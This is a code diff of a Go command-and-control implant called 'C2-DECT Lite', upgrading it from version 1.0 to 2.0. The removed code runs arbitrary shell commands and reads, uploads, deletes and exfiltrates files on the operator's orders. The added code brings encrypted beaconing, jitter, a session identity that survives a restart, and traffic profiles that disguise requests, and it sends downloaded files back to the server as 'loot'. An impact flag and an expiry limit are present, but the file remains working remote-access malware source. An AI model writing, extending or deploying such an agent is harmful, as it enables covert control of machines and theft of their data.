@@ -1,39 +1,64 @@
+// Package main implements the C2-DECT Lite 2.0 agent.
+//
+// The agent beacons to the operator server, executes the tasks it receives
+// and returns the results. The transport is encrypted with ECDH P-256 and
+// AES-256-GCM, the session identity survives a restart and the beacon timing
+// is shaped by a jitter model with exponential backoff on failures.
 package main
 
 import (
-	"bytes"
 	"crypto/ecdh"
 	cryptorand "crypto/rand"
-	"crypto/sha256"
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
+	"errors"
+	"flag"
 	"fmt"
-	"io"
-	"math/rand"
-	"net/http"
 	"os"
-	"os/exec"
-	"os/user"
 	"path/filepath"
-	"runtime"
 	"strconv"
 	"strings"
 	"time"
 )
 
-type AgentConfig struct {
-	ServerURL  string
-	ServerPort uint16
-	SleepSec   uint32
-	Jitter     uint32
-	SessionID  string
-	AESKey     []byte
-	PrivateKey *ecdh.PrivateKey
+// Version is the agent version reported to the server.
+const Version = "2.0.0"
+
+// Config holds the runtime configuration of the agent.
+type Config struct {
+	ServerURL   string
+	ServerPort  uint16
+	UseTLS      bool
+	InsecureTLS bool
+	SleepSec    uint32
+	Jitter      uint32
+	JitterMode  JitterMode
+	Token       string
+	ExpiryUnix  int64
+	StatePath   string
+	ChunkSize   int
+	HTTPTimeout time.Duration
+	Verbose     bool
+	AllowImpact bool
+
+	SessionID   string
+	PrivateKey  *ecdh.PrivateKey
+	ServerPub   *ecdh.PublicKey
+	AESKey      []byte
+	SessionUUID string
 }
 
-type Beacon struct {
-	SessionID  string `json:"session_id"`
+// envelope is the transport frame shared with the server.
+type envelope struct {
+	SessionID string      `json:"session_id"`
+	PublicKey string      `json:"public_key,omitempty"`
+	Agent     *hello      `json:"agent,omitempty"`
+	Data      string      `json:"data,omitempty"`
+}
+
+// hello is the plaintext first contact.
+type hello struct {
 	Hostname   string `json:"hostname"`
 	Username   string `json:"username"`
 	InternalIP string `json:"internal_ip"`
@@ -41,380 +66,320 @@ type Beacon struct {
 	Arch       string `json:"arch"`
 	PID        int    `json:"pid"`
 	Process    string `json:"process"`
-	SleepSec   uint32 `json:"sleep_sec"`
+	SleepSec   int    `json:"sleep_sec"`
+	Jitter     int    `json:"jitter"`
+	Version    string `json:"agent_version"`
+	ExpiryUnix int64  `json:"expiry_unix"`
+	Token      string `json:"token,omitempty"`
 }
 
-type Task struct {
+// body is the encrypted payload.
+type body struct {
+	Type       string `json:"type"` // checkin | result
+	Hello      *hello `json:"hello,omitempty"`
+	TaskID     int64  `json:"task_id,omitempty"`
+	Output     string `json:"output,omitempty"`
+	Error      string `json:"error,omitempty"`
+	Success    bool   `json:"success,omitempty"`
+	ChunkIndex int    `json:"chunk_index,omitempty"`
+	ChunkTotal int    `json:"chunk_total,omitempty"`
+	LootType   string `json:"loot_type,omitempty"`
+	LootName   string `json:"loot_name,omitempty"`
+	LootData   string `json:"loot_data,omitempty"`
+}
+
+// ack is the answer of the server to a checkin.
+type ack struct {
+	Type      string     `json:"type"`
+	SessionID string     `json:"session_id"`
+	UUID      string     `json:"uuid"`
+	SleepSec  int        `json:"sleep_sec"`
+	Jitter    int        `json:"jitter"`
+	ServerTime string    `json:"server_time"`
+	TenantID  int64      `json:"tenant_id"`
+	Task      *taskSpec  `json:"task,omitempty"`
+	Profile   *profile   `json:"profile,omitempty"`
+}
+
+// taskSpec is a unit of work.
+type taskSpec struct {
 	ID      int64  `json:"id"`
 	Command string `json:"command"`
 	Args    string `json:"args"`
 }
 
-type Result struct {
-	TaskID  int64  `json:"task_id"`
-	Output  string `json:"output"`
-	Error   string `json:"error"`
-	Success bool   `json:"success"`
+// profile is the traffic profile handed to the agent.
+type profile struct {
+	Name        string            `json:"name"`
+	Method      string            `json:"method"`
+	URIs        []string          `json:"uris"`
+	UserAgents  []string          `json:"user_agents"`
+	Headers     map[string]string `json:"headers"`
+	Cookies     map[string]string `json:"cookies"`
+	ContentType string            `json:"content_type"`
+	EncodeMode  string            `json:"encode_mode"`
+	Prepend     string            `json:"prepend"`
+	Append      string            `json:"append"`
 }
 
 func main() {
-	config := AgentConfig{
-		ServerURL:  "127.0.0.1",
-		ServerPort: 8443,
-		SleepSec:   10,
-		Jitter:     30,
+	cfg := Config{
+		ServerURL:   "127.0.0.1",
+		ServerPort:  8443,
+		SleepSec:    10,
+		Jitter:      30,
+		JitterMode:  JitterActivity,
+		ChunkSize:   256 * 1024,
+		HTTPTimeout: 30 * time.Second,
 	}
 
-	// Parse args
-	for i := 1; i < len(os.Args); i++ {
-		switch os.Args[i] {
-		case "-s", "--server":
-			if i+1 < len(os.Args) {
-				config.ServerURL = os.Args[i+1]
-				i++
-			}
-		case "-p", "--port":
-			if i+1 < len(os.Args) {
-				port, _ := strconv.Atoi(os.Args[i+1])
-				config.ServerPort = uint16(port)
-				i++
-			}
-		case "-S", "--sleep":
-			if i+1 < len(os.Args) {
-				sleep, _ := strconv.Atoi(os.Args[i+1])
-				config.SleepSec = uint32(sleep)
-				i++
-			}
+	flagServer := flag.String("s", "127.0.0.1", "server host or address of the operator server")
+	flagPort := flag.Int("p", 8443, "port of the operator server")
+	flagSleep := flag.Int("S", 10, "beacon interval in seconds")
+	flagJitter := flag.Int("j", 30, "jitter percentage")
+	flagJitterMode := flag.String("m", string(JitterActivity), "jitter model: uniform, activity or none")
+	flagToken := flag.String("T", "", "bootstrap token that binds the agent to a tenant")
+	flagExpiry := flag.Int64("e", 0, "absolute expiry of the agent (unix timestamp)")
+	flagState := flag.String("f", "", "path of the state file holding the session identity")
+	flagTLS := flag.Bool("tls", false, "use HTTPS instead of HTTP")
+	flagInsecure := flag.Bool("k", false, "accept self signed certificates (lab only)")
+	flagVerbose := flag.Bool("v", false, "print the beacon statistics")
+	flagImpact := flag.Bool("allow-impact", false, "allow the commands with impact level (shell, kill, rm, mv); off by default")
+	flag.Parse()
+
+	cfg.ServerURL = *flagServer
+	cfg.ServerPort = uint16(*flagPort)
+	cfg.SleepSec = uint32(*flagSleep)
+	cfg.Jitter = uint32(*flagJitter)
+	cfg.JitterMode = JitterMode(*flagJitterMode)
+	cfg.Token = *flagToken
+	cfg.ExpiryUnix = *flagExpiry
+	cfg.StatePath = *flagState
+	cfg.UseTLS = *flagTLS
+	cfg.InsecureTLS = *flagInsecure
+	cfg.Verbose = *flagVerbose
+	cfg.AllowImpact = *flagImpact
+
+	if cfg.SleepSec < 1 {
+		cfg.SleepSec = 1
+	}
+	if cfg.Jitter > 100 {
+		cfg.Jitter = 100
+	}
+	if _, ok := parseJitterMode(string(cfg.JitterMode)); !ok {
+		fmt.Fprintf(os.Stderr, "[-] unknown jitter mode %q, using %q\n", cfg.JitterMode, JitterActivity)
+		cfg.JitterMode = JitterActivity
+	}
+	if cfg.StatePath == "" {
+		cfg.StatePath = defaultStatePath()
+	}
+
+	// --- identity -------------------------------------------------------
+	if err := loadState(&cfg); err != nil {
+		fmt.Fprintf(os.Stderr, "[-] could not load the session state: %v\n", err)
+	}
+	if cfg.PrivateKey == nil {
+		key, err := ecdh.P256().GenerateKey(cryptorand.Reader)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "[-] key generation failed: %v\n", err)
+			os.Exit(1)
 		}
+		cfg.PrivateKey = key
 	}
+	if cfg.SessionID == "" {
+		cfg.SessionID = buildSessionID()
+	}
+	_ = saveState(&cfg)
 
-	// Generate session ID
-	rand_bytes := make([]byte, 8)
-	cryptorand.Read(rand_bytes)
-	config.SessionID = hex.EncodeToString(rand_bytes)[:16]
+	fmt.Printf("[*] C2-DECT Lite agent %s\n", Version)
+	fmt.Printf("[*] server   %s\n", cfg.baseURL())
+	fmt.Printf("[*] session  %s\n", cfg.SessionID)
+	fmt.Printf("[*] sleep    %ds (jitter %d%%, mode %s)\n", cfg.SleepSec, cfg.Jitter, cfg.JitterMode)
+	fmt.Printf("[*] impacto %s\n", impactLabel(cfg.AllowImpact))
+	if cfg.ExpiryUnix > 0 {
+		fmt.Printf("[*] expiry   %s\n", time.Unix(cfg.ExpiryUnix, 0).UTC().Format(time.RFC3339))
+	}
+	if cfg.Token != "" {
+		fmt.Printf("[*] tenant   bootstrap token supplied\n")
+	}
+	fmt.Println()
 
-	hostname, _ := os.Hostname()
-	config.SessionID = hostname + "_" + config.SessionID[:8]
+	client := newClient(&cfg)
+	rng := newJitterRand()
 
-	fmt.Printf("[*] C2-DECT Lite Agent v1.0\n")
-	fmt.Printf("[*] Server: %s:%d\n", config.ServerURL, config.ServerPort)
-	fmt.Printf("[*] Session: %s\n", config.SessionID)
-
-	// Key exchange
-	keyExchange(&config)
-
-	// Main loop
+	failures := 0
 	for {
-		sendBeacon(&config)
-		checkAndExecute(&config)
-
-		sleepTime := int64(config.SleepSec)*1000 + (rand.Int63n(int64(config.SleepSec)*1000*int64(config.Jitter)/100)*2 - int64(config.SleepSec)*1000*int64(config.Jitter)/100)
-		if sleepTime < 1000 {
-			sleepTime = 1000
+		if expired(cfg.ExpiryUnix) {
+			fmt.Println("[!] the agent reached its expiry date, terminating")
+			return
 		}
-		time.Sleep(time.Duration(sleepTime) * time.Millisecond)
+
+		task, err := client.checkin(&cfg)
+		if err != nil {
+			if errors.Is(err, errRekeyRequired) {
+				// The server asked for a new transport key, retry at once.
+				continue
+			}
+			failures++
+			wait := backoffDuration(cfg.SleepSec, failures)
+			fmt.Fprintf(os.Stderr, "[!] beacon failed (%v), retrying in %s\n", err, wait)
+			time.Sleep(wait)
+			continue
+		}
+		if failures > 0 {
+			fmt.Printf("[+] reconnected after %d failed beacons\n", failures)
+			failures = 0
+		}
+
+		if task != nil {
+			runTask(&cfg, client, task)
+		}
+
+		sleep := NextInterval(int64(cfg.SleepSec)*1000, cfg.Jitter, cfg.JitterMode, time.Now(), rng)
+		if cfg.Verbose {
+			fmt.Printf("[*] next beacon in %s\n", time.Duration(sleep)*time.Millisecond)
+		}
+		time.Sleep(time.Duration(sleep) * time.Millisecond)
 	}
 }
 
-func keyExchange(config *AgentConfig) {
-	curve := ecdh.P256()
-	privKey, _ := curve.GenerateKey(cryptorand.Reader)
-	config.PrivateKey = privKey
-
-	pubBytes := privKey.PublicKey().Bytes()
-	body := fmt.Sprintf(`{"session_id":"%s","public_key":"%s"}`, config.SessionID, hex.EncodeToString(pubBytes))
-
-	resp, err := http.Post(fmt.Sprintf("http://%s:%d/agent/key/exchange", config.ServerURL, config.ServerPort),
-		"application/json", strings.NewReader(body))
-	if err != nil {
-		return
+// baseURL returns the operator server URL.
+func (c *Config) baseURL() string {
+	scheme := "http"
+	if c.UseTLS {
+		scheme = "https"
 	}
-	defer resp.Body.Close()
-
-	var result map[string]string
-	json.NewDecoder(resp.Body).Decode(&result)
-
-	if serverPubHex, ok := result["public_key"]; ok {
-		serverPubBytes, _ := hex.DecodeString(serverPubHex)
-		serverPubKey, _ := curve.NewPublicKey(serverPubBytes)
-		sharedSecret, _ := privKey.ECDH(serverPubKey)
-		hash := sha256.Sum256(sharedSecret)
-		config.AESKey = hash[:]
-	}
+	return fmt.Sprintf("%s://%s:%d", scheme, c.ServerURL, c.ServerPort)
 }
 
-func sendBeacon(config *AgentConfig) {
+// buildSessionID builds a readable session identifier.
+func buildSessionID() string {
 	hostname, _ := os.Hostname()
-	username := "unknown"
-	if u, err := user.Current(); err == nil {
-		username = u.Username
-	}
-
-	beacon := Beacon{
-		SessionID: config.SessionID,
-		Hostname:  hostname,
-		Username:  username,
-		OS:        runtime.GOOS,
-		Arch:      runtime.GOARCH,
-		PID:       os.Getpid(),
-		Process:   "agent-lite",
-		SleepSec:  config.SleepSec,
-	}
-
-	data, _ := json.Marshal(beacon)
-	url := fmt.Sprintf("http://%s:%d/agent/checkin", config.ServerURL, config.ServerPort)
-	resp, err := http.Post(url, "application/json", bytes.NewReader(data))
-	if err != nil {
-		return
-	}
-	defer resp.Body.Close()
+	buf := make([]byte, 4)
+	_, _ = cryptorand.Read(buf)
+	return fmt.Sprintf("%s_%s", hostname, hex.EncodeToString(buf))
 }
 
-func checkAndExecute(config *AgentConfig) {
-	url := fmt.Sprintf("http://%s:%d/agent/task/pending?session_id=%s",
-		config.ServerURL, config.ServerPort, config.SessionID)
-	resp, err := http.Get(url)
+// defaultStatePath returns the path of the state file.
+func defaultStatePath() string {
+	base, err := os.UserHomeDir()
 	if err != nil {
-		return
+		base = os.TempDir()
 	}
-	defer resp.Body.Close()
+	return filepath.Join(base, ".c2-dect-lite", "agent.json")
+}
 
-	body, _ := io.ReadAll(resp.Body)
-	var result map[string]interface{}
-	json.Unmarshal(body, &result)
+// state is the persisted identity of the agent.
+type state struct {
+	SessionID    string `json:"session_id"`
+	PrivateKey   string `json:"private_key"`
+	ServerPub    string `json:"server_public_key"`
+	SessionUUID  string `json:"session_uuid"`
+	CreatedAt    string `json:"created_at"`
+}
 
-	if result["status"] != "task" {
-		return
+func loadState(cfg *Config) error {
+	data, err := os.ReadFile(cfg.StatePath)
+	if err != nil {
+		return err
 	}
-
-	taskMap := result["task"].(map[string]interface{})
-	task := Task{
-		ID:      int64(taskMap["id"].(float64)),
-		Command: taskMap["command"].(string),
-		Args:    taskMap["args"].(string),
+	var st state
+	if err := json.Unmarshal(data, &st); err != nil {
+		return err
 	}
-
-	output := ""
-	errStr := ""
-	success := true
-
-	// Parse command: if command contains space, split into base command + args
-	baseCmd := task.Command
-	cmdArgs := task.Args
-	if cmdArgs == "" && strings.Contains(task.Command, " ") {
-		parts := strings.SplitN(task.Command, " ", 2)
-		baseCmd = parts[0]
-		cmdArgs = parts[1]
+	cfg.SessionID = st.SessionID
+	cfg.SessionUUID = st.SessionUUID
+	if st.PrivateKey != "" {
+		raw, err := hex.DecodeString(st.PrivateKey)
+		if err != nil {
+			return err
+		}
+		key, err := ecdh.P256().NewPrivateKey(raw)
+		if err != nil {
+			return err
+		}
+		cfg.PrivateKey = key
 	}
-
-	switch baseCmd {
-	case "shell":
-		var cmd *exec.Cmd
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("cmd.exe", "/C", cmdArgs)
-		} else {
-			cmd = exec.Command("sh", "-c", cmdArgs)
-		}
-		out, err := cmd.CombinedOutput()
-		output = string(out)
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		}
-
-	case "sleep":
-		secs, _ := strconv.Atoi(cmdArgs)
-		if secs > 0 {
-			config.SleepSec = uint32(secs)
-			output = fmt.Sprintf("Sleep set to %d seconds", secs)
-		}
-
-	case "ls", "dir":
-		output, err = listFiles(cmdArgs)
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		}
-
-	case "cat", "type":
-		data, err := readFile(cmdArgs)
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		} else {
-			output = string(data)
-		}
-
-	case "upload":
-		// Args format: remote_path|base64_data
-		parts := strings.SplitN(cmdArgs, "|", 2)
-		if len(parts) == 2 {
-			data, _ := base64.StdEncoding.DecodeString(parts[1])
-			// If no path specified, save to uploads folder
-			targetPath := parts[0]
-			if targetPath == "" {
-				dataDir := getDataDir()
-				targetPath = filepath.Join(dataDir, "uploads", fmt.Sprintf("upload_%d.bin", time.Now().UnixMilli()))
-			}
-			err := writeFile(targetPath, data)
-			if err != nil {
-				errStr = err.Error()
-				success = false
-			} else {
-				output = fmt.Sprintf("File uploaded: %s (%d bytes)", targetPath, len(data))
-			}
-		} else {
-			errStr = "Usage: upload remote_path|base64_data"
-			success = false
-		}
-
-	case "download":
-		data, err := readFile(cmdArgs)
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		} else {
-			// Also save a copy to downloads folder
-			dataDir := getDataDir()
-			filename := filepath.Base(cmdArgs)
-			if filename == "" || filename == "." {
-				filename = fmt.Sprintf("download_%d.bin", time.Now().UnixMilli())
-			}
-			dlPath := filepath.Join(dataDir, "downloads", filename)
-			os.WriteFile(dlPath, data, 0644)
-			output = base64.StdEncoding.EncodeToString(data)
-		}
-
-	case "cp", "copy":
-		parts := strings.Split(cmdArgs, " ")
-		if len(parts) == 2 {
-			err := copyFile(parts[0], parts[1])
-			if err != nil {
-				errStr = err.Error()
-				success = false
-			} else {
-				output = fmt.Sprintf("Copied: %s -> %s", parts[0], parts[1])
+	if st.ServerPub != "" {
+		raw, err := hex.DecodeString(st.ServerPub)
+		if err == nil {
+			if pub, err := ecdh.P256().NewPublicKey(raw); err == nil {
+				cfg.ServerPub = pub
 			}
 		}
-
-	case "mv", "move":
-		parts := strings.Split(cmdArgs, " ")
-		if len(parts) == 2 {
-			err := moveFile(parts[0], parts[1])
-			if err != nil {
-				errStr = err.Error()
-				success = false
-			} else {
-				output = fmt.Sprintf("Moved: %s -> %s", parts[0], parts[1])
-			}
-		}
-
-	case "rm", "del":
-		err := deleteFile(cmdArgs)
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		} else {
-			output = fmt.Sprintf("Deleted: %s", cmdArgs)
-		}
-
-	case "mkdir":
-		err := createDirectory(cmdArgs)
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		} else {
-			output = fmt.Sprintf("Created: %s", cmdArgs)
-		}
-
-	case "find", "search":
-		parts := strings.Split(cmdArgs, " ")
-		if len(parts) == 2 {
-			output, err = searchFiles(parts[0], parts[1])
-			if err != nil {
-				errStr = err.Error()
-				success = false
-			}
-		}
-
-	case "ps", "processes":
-		output, err = getProcessList()
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		}
-
-	case "kill":
-		err := killProcess(cmdArgs)
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		} else {
-			output = fmt.Sprintf("Process %s killed", cmdArgs)
-		}
-
-	case "sysinfo":
-		output, err = getSystemInfo()
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		}
-
-	case "netinfo":
-		output, err = getNetworkInfo()
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		}
-
-	case "services":
-		output, err = getRunningServices()
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		}
-
-	case "env":
-		output, err = getEnvironmentVars()
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		}
-
-	case "connections", "netstat":
-		output, err = getConnections()
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		}
-
-	case "exit":
-		os.Exit(0)
-
-	default:
-		// If unknown command, try to run as shell
-		var cmd *exec.Cmd
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("cmd.exe", "/C", task.Command)
-		} else {
-			cmd = exec.Command("sh", "-c", task.Command)
-		}
-		out, err := cmd.CombinedOutput()
-		output = string(out)
-		if err != nil {
-			errStr = err.Error()
-			success = false
-		}
 	}
+	return nil
+}
 
-	resultData := Result{
-		TaskID:  task.ID,
-		Output:  output,
-		Error:   errStr,
-		Success: success,
+func saveState(cfg *Config) error {
+	if cfg.PrivateKey == nil {
+		return errors.New("no private key")
 	}
+	st := state{
+		SessionID:   cfg.SessionID,
+		PrivateKey:  hex.EncodeToString(cfg.PrivateKey.Bytes()),
+		SessionUUID: cfg.SessionUUID,
+		CreatedAt:   time.Now().UTC().Format(time.RFC3339),
+	}
+	if cfg.ServerPub != nil {
+		st.ServerPub = hex.EncodeToString(cfg.ServerPub.Bytes())
+	}
+	data, err := json.MarshalIndent(st, "", "  ")
+	if err != nil {
+		return err
+	}
+	if err := os.MkdirAll(filepath.Dir(cfg.StatePath), 0700); err != nil {
+		return err
+	}
+	return os.WriteFile(cfg.StatePath, data, 0600)
+}
 
-	resultJSON, _ := json.Marshal(resultData)
-	url = fmt.Sprintf("http://%s:%d/agent/task/result", config.ServerURL, config.ServerPort)
-	http.Post(url, "application/json", bytes.NewReader(resultJSON))
+// runTask executes one task and returns the result.
+func runTask(cfg *Config, client *client, task *taskSpec) {
+	output, errStr, success := execute(cfg, task)
+	if errStr != "" {
+		fmt.Fprintf(os.Stderr, "[!] task %d failed: %s\n", task.ID, errStr)
+	}
+	lootType, lootName, lootData := collectLoot(cfg, task, output)
+	_ = client.sendResult(cfg, task.ID, output, errStr, success, lootType, lootName, lootData)
+}
+
+// collectLoot extracts a binary artifact from a task result.
+func collectLoot(cfg *Config, task *taskSpec, output string) (string, string, string) {
+	if task.Command != "download" {
+		return "", "", ""
+	}
+	if output == "" {
+		return "", "", ""
+	}
+	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(output))
+	if err != nil {
+		return "", "", ""
+	}
+	return "file", filepath.Base(task.Args), base64.StdEncoding.EncodeToString(raw)
+}
+
+// expired reports whether an absolute expiry has been reached.
+func expired(expiryUnix int64) bool {
+	if expiryUnix <= 0 {
+		return false
+	}
+	return time.Now().UTC().Unix() >= expiryUnix
+}
+
+// impactLabel describes the impact level the agent was started with.
+func impactLabel(allowed bool) string {
+	if allowed {
+		return "HABILITADO (shell, kill, rm, mv)"
+	}
+	return "REDUCIDO (shell, kill, rm y mv bloqueados: use -allow-impact)"
+}
+
+// atoi is a forgiving integer parser.
+func atoi(raw string) int {
+	v, err := strconv.Atoi(strings.TrimSpace(raw))
+	if err != nil {
+		return 0
+	}
+	return v
 }
